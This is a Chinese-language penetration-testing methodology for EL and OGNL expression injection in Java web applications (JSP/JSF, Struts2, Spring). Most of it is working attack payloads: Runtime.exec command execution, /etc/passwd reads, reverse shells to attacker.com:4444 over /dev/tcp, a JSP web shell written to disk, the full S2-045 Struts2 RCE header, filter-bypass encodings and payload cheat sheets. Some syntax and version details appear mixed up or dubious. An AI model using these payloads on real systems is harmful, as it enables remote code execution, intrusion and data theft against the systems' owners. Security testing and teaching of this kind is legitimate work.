# EL/OGNL 注入攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 EL（Expression Language）和 OGNL（Object-Graph Navigation Language）注入漏洞的标准化测试与利用流程，帮助识别和利用 Java Web 应用中的表达式注入漏洞。

## 1.2 适用范围
适用于使用 Java 技术栈的 Web 应用，特别是使用 JSP/JSF（EL 表达式）、Struts2（OGNL）、Spring Framework（SpEL）等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题一：EL 表达式注入

### 2.1.1 技术介绍

EL（Expression Language）注入是指攻击者通过构造恶意 EL 表达式，在服务器端执行任意代码的攻击方式。EL 是 JSP/JSF 等 Java Web 技术中用于访问 JavaBean 属性的表达式语言。

**EL 表达式语法：**
```
${expression}
#{expression}  # JSF 延迟求值
```

**危险场景：**
- 用户输入直接拼接到 JSP 页面
- 搜索关键词在 JSP 中用 EL 解析
- 错误页面回显用户输入

### 2.2.1 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **搜索功能** | 站内搜索、商品搜索 | 搜索结果页面用 EL 解析用户输入 |
| **错误页面** | 404/500 错误页 | 错误信息回显用户输入 |
| **留言板/评论** | 用户评论展示 | 评论内容未经过滤直接显示 |
| **用户资料** | 个人信息展示 | 用户名等字段可控 |
| **JSF 应用** | JavaServer Faces 应用 | #{} 表达式可被注入 |

### 2.3.1 漏洞探测方法

#### 黑盒测试

**初步探测 Payload：**

```
# 基础 EL 语法测试
${1+1}
#{1+1}

# 数学运算
${10-5}
${3*7}
${10/2}

# 字符串操作
${'a'=='a'}
${"hello".length()}

# 访问内置对象
${pageContext}
${request}
${session}
${application}
```

**响应判断：**
- `${2}` 返回 `2`（表达式被解析）
- 页面返回异常或错误
- 出现 Java 类名或包名
- 响应中包含 EL 解析后的结果

#### 白盒测试

**代码审计关键词（JSP）：**
```jsp
<!-- 危险代码 -->
<%= request.getParameter("search") %>  <!-- 直接输出 -->
<c:out value="${param.search}" />       <!-- 可能解析 EL -->

<!-- 如果用户输入 ${...} 被存储并后续解析 -->
String search = request.getParameter("search");
request.setAttribute("searchResult", search);
// 在 JSP 中：${searchResult}
```

**代码审计关键词（Java）：**
```java
// 危险代码 - EL 表达式解析
ExpressionFactory factory = ExpressionFactory.newInstance();
ValueExpression ve = factory.createValueExpression(elContext, userInput, Object.class);
Object result = ve.getValue(elContext);
```

### 2.4.1 漏洞利用方法

#### 信息收集

```
# 获取系统属性
${System.getProperties()}

# 获取环境变量
${System.getenv()}

# 获取运行时信息
${Runtime.getRuntime().exec('whoami')}

# 访问 pageContext
${pageContext.request.method}
${pageContext.response}
```

#### 执行命令

```
# 基础命令执行
${Runtime.getRuntime().exec("whoami")}

# 使用 ProcessBuilder
${new java.lang.ProcessBuilder("bash", "-c", "id").start()}

# 读取命令执行结果（需要额外步骤）
```

#### 读取文件

```
# 读取文件内容
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}

# 使用 Scanner
${new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()}
```

#### 反弹 Shell

```
# Bash 反弹
${Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"})}

# 使用 Socket
${new java.net.Socket("attacker.com", 4444)}
```

---

## 专题二：OGNL 表达式注入

### 2.1.2 技术介绍

OGNL（Object-Graph Navigation Language）注入主要影响使用 Apache Struts2 框架的 Java Web 应用。攻击者可通过构造恶意 OGNL 表达式，在服务器端执行任意代码。

**Struts2 OGNL 上下文：**
- `#context` - OGNL 上下文
- `@class@method` - 静态方法调用
- `().method()` - 实例方法调用

### 2.2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **Struts2 应用** | 任何 Struts2 应用 | 参数值被 OGNL 解析 |
| **表单提交** | 登录、注册、数据提交 | 表单字段可控 |
| **URL 参数** | 查询参数、RESTful 路径 | 路径变量被解析 |
| **文件上传** | 文件上传功能 | 文件名参数可控 |
| **重定向** | redirect 参数 | 重定向 URL 被解析 |

### 2.3.2 漏洞探测方法

#### 黑盒测试

**初步探测 Payload：**

```
# 基础 OGNL 测试
${2*3}
${10/2}

# Struts2 OGNL 测试（URL 参数）
?(#context)=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('id')

# 简化测试
${1024*1024}
${'str'+'uts'}

# 访问 OGNL 上下文
#context
#parameters
#request
#session
```

**响应判断：**
- 数学表达式被计算
- 出现 OGNL 相关错误
- 命令被执行（通过带外方式验证）
- Struts2 异常信息

#### 白盒测试

**代码审计关键词（Struts2）：**
```java
// 危险配置 - struts.xml
<package name="default" extends="struts-default">
    <!-- 如果使用了不安全的拦截器配置 -->
</package>

// 危险代码 - OGNL 表达式求值
Ognl.getValue(expression, context, root);
```

**检查 Struts2 版本：**
- Struts2 < 2.3.32 存在多个 OGNL 注入漏洞
- Struts2 < 2.5.10 存在 S2-045、S2-046 等高危漏洞

### 2.4.2 漏洞利用方法

#### Struts2 经典 Payload（S2-045）

```
Content-Type: ${#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}

# 命令执行
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlOgnlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlOgnlUtil.getExcludedPackageNames().clear()).(#ognlOgnlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

#### OGNL 信息收集

```
# 获取系统信息
${@java.lang.System@getProperty("os.name")}
${@java.lang.System@getProperty("user.dir")}

# 获取环境变量
${@java.lang.System@getenv()}

# 获取运行时
${@java.lang.Runtime@getRuntime().exec('whoami')}
```

#### OGNL 文件操作

```
# 读取文件
${new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream("/etc/passwd"))).readLine()}

# 写入文件
${new java.io.PrintWriter("/tmp/shell.jsp").write("<% Runtime.getRuntime().exec(request.getParameter('c')); %>")}
```

#### OGNL 反弹 Shell

```
# Bash 反弹
${@java.lang.Runtime@getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"})}
```

### 2.5 漏洞利用绕过方法

#### 绕过关键字过滤

```
# 使用 Unicode 编码
${\u0052untime}  # Runtime

# 使用字符串拼接
${'Run'+'time'}

# 使用字符数组
${new char[]{82,117,110,116,105,109,101}}
```

#### 绕过空格过滤

```
# 使用注释
${T(java.lang.Runtime).getRuntime()./*comment*/exec('id')}

# 使用换行
${T(java.lang.Runtime)
.getRuntime()
.exec('id')}
```

#### 编码绕过

```
# Base64 编码执行
${T(java.lang.Runtime).getRuntime().exec(T(java.util.Base64).getDecoder().decode('aWQ='))}

# URL 编码
%24%7BT%28java.lang.Runtime%29...%7D
```

---

# 第三部分：附录

## 3.1 EL 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **探测** | `${1+1}` | 基础表达式测试 |
| **探测** | `${pageContext}` | 访问内置对象 |
| **信息收集** | `${System.getProperties()}` | 系统属性 |
| **信息收集** | `${System.getenv()}` | 环境变量 |
| **命令执行** | `${Runtime.getRuntime().exec('id')}` | 执行命令 |
| **文件读取** | `${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\A').next()}` | 读取文件 |
| **反弹 Shell** | `${Runtime.getRuntime().exec('bash -c ...')}` | 反弹 Shell |

## 3.2 OGNL 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **探测** | `${2*3}` | 基础测试 |
| **信息收集** | `${@java.lang.System@getProperty("os.name")}` | 系统信息 |
| **命令执行** | `${@java.lang.Runtime@getRuntime().exec('id')}` | 执行命令 |
| **文件读取** | `${new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream('/etc/passwd'))).readLine()}` | 读取文件 |
| **Struts2 RCE** | S2-045 Payload | 完整 RCE（见上文） |

## 3.3 受影响框架版本

| 框架 | 危险版本 | 修复版本 |
|-----|---------|---------|
| **Struts2** | < 2.3.32 | 2.3.32+ |
| **Struts2** | 2.5.0 - 2.5.10 | 2.5.10.1+ |
| **Spring** | < 5.3.18 (SpEL) | 5.3.18+ |
| **JSP/EL** | < 3.0.3 | 3.0.3+ |

## 3.4 参考资源

- [OWASP Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [Apache Struts2 Security Advisories](https://cwiki.apache.org/confluence/display/WW/Security+Advisories)
- [PortSwigger - Server-side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
